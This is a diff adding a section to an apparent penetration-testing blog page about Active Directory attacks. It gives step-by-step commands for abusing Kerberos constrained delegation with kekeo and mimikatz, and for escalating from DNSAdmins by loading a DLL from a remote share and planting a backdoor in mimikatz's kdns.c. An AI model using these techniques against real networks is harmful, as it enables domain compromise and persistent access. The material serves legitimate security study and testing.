@@ -497,13 +497,103 @@ hashcat -a 0 -m 18200 user01.ticket wordlist.txt
 
 <ul>
   <li>
-    <p><strong>Service for User to Self (S4U2self)</strong>: Allows a service to obtain a forwardable TGS to itself on behalf a user.</p>
+    <p><strong>Service for User to Self (S4U2self)</strong>: Allows a service to obtain a forwardable TGS to itself on behalf a user with just the user principal name without supplying a password. The service account must have the <code class="highlighter-rouge">TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> (T2A4D UserAccountControl attribute).</p>
   </li>
   <li>
-    <p><strong>Service for User to Proxy (S4U2proxy)</strong>: Allows a service to obtain a TGS to a second service on behalf of a user.</p>
+    <p><strong>Service for User to Proxy (S4U2proxy)</strong>: Allows a service to obtain a TGS to a second service on behalf of a user. The attribute <code class="highlighter-rouge">msDS-AllowedToDelegate</code> attribute contains a list of SPNs to which the user tokens can be forwarded.</p>
   </li>
 </ul>
 
+<p>To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in <code class="highlighter-rouge">msDS-AllowedToDelegateTo</code> of the web service accoutn as any user.</p>
+
+<ul>
+  <li>PowerView Dev:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -TrustedToAuth
+Get-DomainComputer -TrustedToAuth
+</code></pre></div>    </div>
+  </li>
+  <li>ADModule:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>We can use <code class="highlighter-rouge">asktgt</code> from <code class="highlighter-rouge">kekeo</code> to request a TGT.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\kekeo.exe
+
+tgt::ask /user:websvc /domain
+</code></pre></div></div>
+<p>Once we have the TGT, with kekeo we can request a TGS.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tgt::s4u /tgt:TGT_websvc@CORP.LOCAL_krbtgt~corp.local@corp.local.kirbi /user:Administrator@corp.local /service:cifs/mssql.corp.local
+</code></pre></div></div>
+<p>Finally with mimikatz we can inject the ticket on the current session:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL_cifs~mssql.corp.local@CORP.LOCAL.kirbi"'
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>: The delegation occurs not only for the specified service but for any service running under the same account. The is no validation for the SPN specified.</p>
+</blockquote>
+
+<h1 id="dnsadmins">DNSAdmins</h1>
+
+<p>It is possible for the members of the <strong>DNSAdmins</strong> group to load arbitrary DLL with the privileges of dns.exe which is <code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
+
+<p>In case the domain controllers also serves as DNS, this will provide us escalation to domain admin. We just need privileges to restart the DNS service.</p>
+
+<p>Enumerate the <code class="highlighter-rouge">DNSAdmins</code> group:</p>
+
+<ul>
+  <li>PowerView:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetGroupMember -GroupName <span class="s2">"DNSAdmins"</span>
+</code></pre></div>    </div>
+  </li>
+  <li>ADModule:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADGRoupMember</span> -Identity DNSAdmins
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>After compromise a member and from the privileges of DNSAdmins group, we can configure a <code class="highlighter-rouge">dll</code>:</p>
+
+<ul>
+  <li>dnscmd.exe:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscmd dc01 /config /serverlevelplugindll \\10.10.10.10\share\mimilib.dll
+</code></pre></div>    </div>
+  </li>
+  <li>DNSServer:
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$dnsettings = Get-DnsServerSetting -ComputerName dc01 -Verbose -All
+$dnsettings.ServerLevelPluginDll = "\\10.10.10.10\share\mimilib.dll"
+Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc01 -Verbose
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>We need to restart the service:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc \\dc01.corp.local stop dns
+sc \\dc01.corp.local start dns
+</code></pre></div></div>
+
+<p>By default <code class="highlighter-rouge">mimilib.dll</code> logs all DNS queries on the following file:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\sytem32\kiwidns.log
+</code></pre></div></div>
+
+<p>We can modify the source code of <code class="highlighter-rouge">kdns.c</code> from <code class="highlighter-rouge">mimikatz</code> in order to add a reverse shell or other type of backdoor.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#pragma warning(disable:4996)
+	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
+#pragma warning(pop)
+	{
+		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
+		fclose(kdns_logfile);
+		system("C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -e ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==")   //THIS LINE
+	}
+	return ERROR_SUCCESS;
+}
+</code></pre></div></div>
 
 			</article>
 		</section>
